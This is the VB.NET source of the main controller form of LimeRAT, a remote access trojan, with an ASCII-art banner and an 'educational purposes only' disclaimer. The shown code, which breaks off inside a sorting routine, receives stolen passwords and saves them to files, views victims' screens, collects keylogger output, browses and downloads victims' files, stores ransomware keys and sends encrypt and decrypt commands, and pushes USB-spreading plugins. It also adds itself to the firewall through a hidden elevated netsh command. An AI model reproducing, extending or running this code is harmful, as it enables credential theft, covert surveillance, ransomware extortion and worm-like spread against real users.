'##################################################################
'##         N Y A N   C A T  |||   Updated on Aug/09/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                           .. LimeRAT ..                      ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##            https://github.com/NYAN-x-CAT/Lime-RAT            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################

Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Main

    Public WithEvents S As S_Socket
    Public SPL = S_Settings.SPL



#Region "Form Events"

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
        Try
            S = New S_Socket(S_Settings.PORT)
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        BackgroundWorker1.RunWorkerAsync()

    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Settings.Save()
        Try
            NotifyIcon1.Dispose()
            Application.Exit()
            End
        Catch : End Try
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Main_Rightclick.Renderer = New MyRenderer()
        Dim Client As Net.Sockets.TcpClient = Nothing
        Try
            If GetExternalAddress() = "127.0.0.1" Then
                MetroLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & S_Settings.PORT & " #" & S_Settings.EncryptionKey & "]"
                MetroLabel3.ForeColor = Color.Lime
                Messages("{ Established! }", "Localhost")
            Else
                Client = New Net.Sockets.TcpClient
                Client.Connect(GetExternalAddress, S_Settings.PORT)
                MetroLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & S_Settings.PORT & " #" & S_Settings.EncryptionKey & "]"
                MetroLabel3.ForeColor = Color.Lime
                Messages("{ Established! }", "Connection is established")
            End If
        Catch ex As Net.Sockets.SocketException
            MetroProgressSpinner1.Spinning = False
            MetroLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & S_Settings.PORT & "  #" & S_Settings.EncryptionKey & "]"
            MetroLabel3.ForeColor = Color.Red
            Messages("{ Established! }", "But port " & S_Settings.PORT & " seems to be blocked")
            Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
            Dim result As DialogResult = MessageBox.Show("Port " & S_Settings.PORT & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then
                Try
                    Dim process As New Process()
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    process.StartInfo.FileName = "cmd.exe"
                    process.StartInfo.UseShellExecute = True
                    process.StartInfo.Verb = "runas"
                    process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
                    process.Start()
                    process.WaitForExit()
                    Process.Start(Application.ExecutablePath)
                    End
                Catch ex1 As Exception
                End Try
            End If
        Finally
            Try : Client.Close() : Catch : End Try
        End Try

    End Sub


#End Region


#Region "Server Events"
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                u.L.Remove()
                Messages("{" + u.IP.Split(":")(0) + "}", "Disconnected")
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub S_Connected(ByVal u As USER) Handles S.Connected

    End Sub

#End Region


#Region "Clients Requests"

    Private Shared _Gio As New S_GIO(Application.StartupPath & "\Misc\GIO.dat")
    Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(b)), S_Settings.SPL)
        Try
            Select Case A(0)

#Region "Add to L1"

                Case "info" ' Client Sent me PC name
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        u.L = L1.Items.Add(_Gio.LookupCountryName(u.IP.Split(":")(0)), _Gio.LookupCountryCode(u.IP.Split(":")(0)) & ".png")
                        u.L.Tag = u
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 1 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next

                        If GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USERN.Index).Text + " Color") IsNot Nothing Then
                            u.L.ForeColor = ColorTranslator.FromHtml(GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USERN.Index).Text + " Color"))
                        End If

                        If GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USERN.Index).Text + " Note") IsNot Nothing Then
                            u.L.SubItems(NOTE_.Index).Text = GTV(u.L.SubItems(ID.Index).Text + "_" + u.L.SubItems(USERN.Index).Text + " Note")
                        End If

                        Fix()
                    End SyncLock

                    Messages("{" + u.IP.Split(":")(0) + "}", "Connected")

                    If MetroToggle1.Checked = True Then
                        NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                        NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP.Split(":")(0)
                        NotifyIcon1.BalloonTipTitle = "LimeRAT | New Connection!"
                        NotifyIcon1.ShowBalloonTip(600)
                    End If
                    Exit Select

#End Region

#Region "Update L1"

                Case "!P" ' ping
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(PING.Index).Text = u.MS & "ms"
                        u.MS = 0
                        Fix()
                    End SyncLock
                    Exit Select

                Case "!R"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        u.L.SubItems(RANS.Index).Text = A(1).ToString
                        Fix()
                    End SyncLock
                    Exit Select

                Case "!SP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    SyncLock L1.Items
                        If A(1).ToString.Contains("Spreaded!") Then
                            u.L.BackColor = Color.DarkGreen
                            u.L.SubItems(SP.Index).Text = "Just Spreaded!"
                        Else
                            u.L.SubItems(SP.Index).Text = A(1).ToString
                        End If
                        Fix()
                    End SyncLock
                    Exit Select

#End Region

#Region "Remote Desktop"

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))

                    If _RDP Is Nothing Then
                        _RDP = New Remote_Desktop
                        _RDP.M = Me
                        _RDP.U = u
                        _RDP.Name = "!" + A(1)
                        _RDP.Sz = New Size(A(2), A(3))
                        _RDP.Text = "Remote Desktop - " & u.IP.Split(":")(0)
                        _RDP.Show()
                    End If
                    Exit Select

                Case "@" ' i recive image  
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))
                    If _RDP IsNot Nothing Then
                        If A(2).Length = 1 Then
                            If _RDP.MetroButton1.Text = "Stop" Then
                                S.Send(u, "@" & SPL & _RDP.Combo_size.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.Combo_quality.SelectedItem)
                            End If
                            Exit Sub
                        End If
                        _RDP.PktToImage(SB(A(2)))
                    End If
                    Exit Select
#End Region

#Region "Password Recovery"

                Case "PWD+"

                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim Pass As Pass_Recovery = My.Application.OpenForms("PWD")
                    If Pass Is Nothing Then
                        Pass = New Pass_Recovery
                        Pass.M = Me
                        Pass.U = u
                        Pass.Name = "PWD"
                        Pass.Text = " Passwords"
                        Pass.Show()
                    End If

                    'duplicate 
                    Try
                        For Each listItem As ListViewItem In Pass.L1.Items
                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
                                Exit Select
                            End If
                        Next
                    Catch ex As Exception
                    End Try

                    Try
                        Dim aa As String() = Split(A(1), "~|~")
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.SubItems.Add(aa(i + 6))
                            ii.SubItems.Add(aa(i + 8))
                            Pass.L1.Items.Add(ii)
                            i += 9
                        Next
                        Pass.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Catch ex As Exception
                    End Try

                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
                    Exit Select
#End Region

#Region "System Manager"

                Case "SysInfo"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(20))
                    If sys Is Nothing Then
                        sys = New System_Manager
                        sys.M = Me
                        sys.U = u
                        sys.Name = "Info" + A(20)
                        sys.Text = "System Manager " + u.IP.Split(":")(0)
                        sys.Show()
                    End If

                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
                    Dim GL As New ListViewGroup("Client", HorizontalAlignment.Left)
                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)

                    Try
                        With sys.ListView1
                            .Clear()
                            .FullRowSelect = True
                            .View = View.Details
                            .Columns.Add("")
                            .Columns.Add("")
                            .HeaderStyle = ColumnHeaderStyle.None

                            .Groups.Add(GU)
                            .Groups.Add(GW)
                            .Groups.Add(GS)
                            .Groups.Add(GL)
                            .Groups.Add(GM)
                        End With
                    Catch ex As Exception
                    End Try

                    With sys.ListView1.Items
                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))

                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
                        .Add(New ListViewItem("Client ID: ", GU)).SubItems.Add(A(20))


                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))


                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))

                        .Add(New ListViewItem("Pastebin URL: ", GL)).SubItems.Add(A(24))
                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))

                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
                    End With

                    sys.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "PROC"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(3))
                    If sys IsNot Nothing Then

                        Try
                            With sys.L2
                                .Clear()
                                .View = View.Details
                                .Columns.Add("Process name", 250)
                                .Columns.Add("Process ID", 80)
                                .Columns.Add("Process path", 250)
                                .GridLines = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim PR As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To PR.Length
                                With sys.L2.Items.Add(PR(i))
                                    .SubItems.Add(PR(i + 1))
                                    .SubItems.Add(PR(i + 2))
                                    i += 2
                                End With
                            Next
                        Catch ex1 As Exception
                        End Try

                        Try
                            For Each x As ListViewItem In sys.L2.Items
                                If x.SubItems(2).Text = A(2) Then
                                    x.ForeColor = Color.FromArgb(142, 188, 0)
                                End If
                            Next
                        Catch ex2 As Exception
                        End Try
                    End If

                    sys.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "STUP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(9))
                    If sys IsNot Nothing Then
                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)

                        Try
                            With sys.L3
                                .Clear()
                                .View = View.Details
                                .HeaderStyle = ColumnHeaderStyle.None
                                .Columns.Add("")
                                .Columns.Add("")
                                .GridLines = True
                                .Groups.Add(G1)
                                .Groups.Add(G2)
                                .Groups.Add(G3)
                                .Groups.Add(G4)
                                .Groups.Add(G8)
                                .Groups.Add(G6)
                                .Groups.Add(G5)
                                .Groups.Add(G7)
                                .ShowGroups = True
                                .FullRowSelect = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(2), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(3), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(4), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(8), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(6), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(5), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(7), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        sys.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Exit Select

#End Region

#Region "Ransomware"

                Case "Key"
                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
                    Exit Select

                Case "SC"
                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
                    Exit Select

                Case "DEC"
                    S.Send(u, "DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
                    Exit Select

                Case "ENC"
                    S.Send(u, "ENC" + SPL + RANS_TEXT + SPL + RANS_IMG)
                    Exit Select
#End Region

#Region "File Manager"
                Case "OFM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" + A(1))
                    If FM Is Nothing Then
                        FM = New File_Manager
                        FM.M = Me
                        FM.U = u
                        FM.Name = "FM" + A(1)
                        FM.Text = "File Manager " + u.IP.Split(":")(0)
                        FM.Show()
                    End If
                    Exit Select

                Case "FM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then


                        If A(2) = "Error " Then
                            FM.BackToolStripMenuItem.PerformClick()
                            FM.Label2.Text = A(3)
                            Return
                        Else
                            FM.L1.Items.Clear()
                            Dim allFiles As String() = Split(A(2), "|SPL_FM|")
                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                    Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                    If fsize > 1073741824 Then
                                        Dim size As Double = fsize / 1073741824
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                    ElseIf fsize > 1048576 Then
                                        Dim size As Double = fsize / 1048576
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                    ElseIf fsize > 1024 Then
                                        Dim size As Double = fsize / 1024
                                        itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                    Else
                                        itm.SubItems(1).Text = fsize.ToString & " B"
                                    End If
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If
                                If itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(4)
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(8)
                                ElseIf itm.Text.EndsWith(".exe") Then
                                    itm.ImageIndex = 3
                                ElseIf itm.Text.EndsWith(".jpg") OrElse itm.Text.EndsWith(".jpeg") OrElse itm.Text.EndsWith(".gif") OrElse itm.Text.EndsWith(".png") OrElse itm.Text.EndsWith(".bmp") Then
                                    itm.ImageIndex = 4
                                ElseIf itm.Text.EndsWith(".doc") OrElse itm.Text.EndsWith(".rtf") OrElse itm.Text.EndsWith(".txt") Then
                                    itm.ImageIndex = 5
                                ElseIf itm.Text.EndsWith(".dll") Then
                                    itm.ImageIndex = 6
                                ElseIf itm.Text.EndsWith(".zip") OrElse itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 7
                                ElseIf itm.Text.EndsWith(".wav") Then
                                    itm.ImageIndex = 9
                                ElseIf itm.Text.EndsWith(".avi") OrElse itm.Text.EndsWith(".mb4") OrElse itm.Text.EndsWith(".flv") OrElse itm.Text.EndsWith(".3gp") Then
                                    itm.ImageIndex = 11
                                ElseIf itm.Text.EndsWith(".mp3") Then
                                    itm.ImageIndex = 12
                                ElseIf itm.Text.EndsWith(".html") OrElse itm.Text.EndsWith(".Php") OrElse itm.Text.EndsWith(".xml") Then
                                    itm.ImageIndex = 10
                                ElseIf itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 13
                                ElseIf itm.Text.EndsWith(".Lime") Then
                                    itm.ForeColor = Color.Lime
                                    itm.ImageIndex = 14
                                Else
                                    itm.ImageIndex = 8
                                End If
                                FM.L1.Items.Add(itm)
                                i += 1
                            Next
                            Try
                                If A(3).ToString.Length > 3 Then
                                    FM.Label1.Text = A(3) + "\"
                                End If
                            Catch ex As Exception
                            End Try
                            FM.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        End If
                    End If
                    Exit Select

                Case "DW"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        IO.File.WriteAllBytes(uFolder(A(1) + "\Downloads", A(3)), Convert.FromBase64String(A(2)))
                        FM.Label2.Text = "Download Finish " + A(3)
                    End If
                    Exit Select

                Case "UP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                        FM.Label2.Text = "Upload Finish " + A(2)
                    End If
                    Exit Select

                Case "DEL"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                    End If
                    Exit Select

                Case "PRE"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        Dim MM = New IO.MemoryStream(SB(A(2)))
                        FM.PictureBox1.Image = Bitmap.FromStream(MM)
                        FM.Label2.ForeColor = Color.Lime
                        FM.Label2.Text = "Preview Size " & siz(A(2).Length)
                        FM.PictureBox1.Visible = True
                        MM.Dispose()
                    End If
                    Exit Select


#End Region

#Region "Keylogger"

                Case "KL"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim KL As Keylogger = My.Application.OpenForms("KL" + A(1))

                    If KL Is Nothing Then
                        KL = New Keylogger
                        KL.M = Me
                        KL.U = u
                        KL.Name = "KL" + A(1)
                        KL.Text = "Keylogger - " & u.IP.Split(":")(0)
                        KL.Show()
                    End If

                    KL.RichTextBox1.Text = A(2)
                    Exit Select

#End Region

#Region "Send Plugin"
                Case "GPL"
                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")

                    For Each file In Folderx
                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))

                        If HASH = A(1) Then
                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(file), True)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
                        End If
                    Next
                    Exit Select

                Case "PLUSB"
                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll"), True)) + SPL + "_USB")
                    Exit Select

                Case "PLPIN"
                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
                    Exit Select
#End Region

#Region "Messages"
                Case "MSG"
                    Messages(u.IP.Split(":")(0), A(1))
                    Exit Select
#End Region

            End Select
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub
#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As DrawItemEventArgs) Handles L2.DrawItem
        Try
            Dim W As New SolidBrush(Color.FromArgb(225, 225, 225))
            Dim L As New SolidBrush(Color.FromArgb(142, 188, 0))

            e.DrawBackground()

            If L2.Items(e.Index).ToString.Contains("Connected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, L, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.DarkRed, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Red, New PointF(e.Bounds.X, e.Bounds.Y))
                Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/

            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.LightSteelBlue, New PointF(e.Bounds.X, e.Bounds.Y))
            Else
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, W, New PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
    End Sub

#End Region


#Region "Theme"

    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        ' Compare the items in the appropriate column
        ' for objects x and y.
        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            ' Get the sub-item values.
            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            ' Compare them.
            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
